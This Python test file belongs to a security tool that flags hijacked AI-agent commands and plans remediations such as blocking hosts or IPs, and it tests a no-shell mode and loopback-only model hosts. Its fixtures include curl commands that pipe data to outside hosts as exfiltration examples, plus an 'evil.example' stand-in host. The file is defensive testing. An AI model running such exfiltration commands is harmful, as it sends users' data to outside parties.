"""Security hardening: --no-shell refuses shell reversals (argv-only), the model host is loopback-only
by default, and these are enforced where it matters."""

import io
from datetime import UTC, datetime

from alibi.alerts import Alert
from alibi.cli import _is_loopback, main
from alibi.link import LinkResult
from alibi.remediate import apply_remediations, plan_remediations
from alibi.transcript import ToolCall
from alibi.verdict import Disposition, Tier, Verdict, VerdictKind

TS = datetime(2026, 1, 1, tzinfo=UTC)


def _v(cmd, reason):
    call = ToolCall(TS, "t1", "Bash", {"command": cmd}, r"C:\p")
    link = LinkResult(call, "linked", 0.9)
    alert = Alert(timestamp=TS, rule_title="r", level="high", computer="PC", channel="Sysmon",
                  event_id=1, record_id="1", rule_id="r", mitre_techniques=(), command_line=cmd)
    return Verdict(alert, link, Disposition.VERDICT, VerdictKind.HIJACKED, 0.85, reason, Tier.POLICY, (), ())


def test_no_shell_refuses_shell_reversal():
    # exfil to a hostname -> block_host is shell-shaped (hosts-file redirect)
    rems = plan_remediations([_v("curl --data-binary @- http://telemetry.dev/x",
                                 "the action targets host:telemetry.dev")], target_os="posix")
    res = apply_remediations(rems, approver=lambda r: True, executor=lambda r: None, allow_shell=False)
    statuses = {r.action: st for r, st in res}
    assert statuses.get("block_host") == "refused-no-shell"


def test_no_shell_allows_argv_reversal():
    # exfil to a bare IP -> block_ip carries an argv vector (shell-free)
    rems = plan_remediations([_v("curl --data-binary @- http://203.0.113.9/x", "exfiltrate")], target_os="posix")
    ran = []
    res = apply_remediations(rems, approver=lambda r: True, executor=ran.append, allow_shell=False)
    statuses = {r.action: st for r, st in res}
    assert statuses.get("block_ip") == "applied" and ran


def test_is_loopback():
    assert _is_loopback("http://127.0.0.1:11434") and _is_loopback("http://localhost:11434")
    assert not _is_loopback("http://10.0.0.5:11434") and not _is_loopback("http://evil.example:11434")


def test_main_refuses_remote_model():
    out, err = io.StringIO(), io.StringIO()
    rc = main(["scan", "nope.csv", "nope.jsonl", "--model", "m", "--ollama-host", "http://evil.example:11434"],
              out=out, err=err)
    assert rc == 2 and "loopback" in err.getvalue().lower()
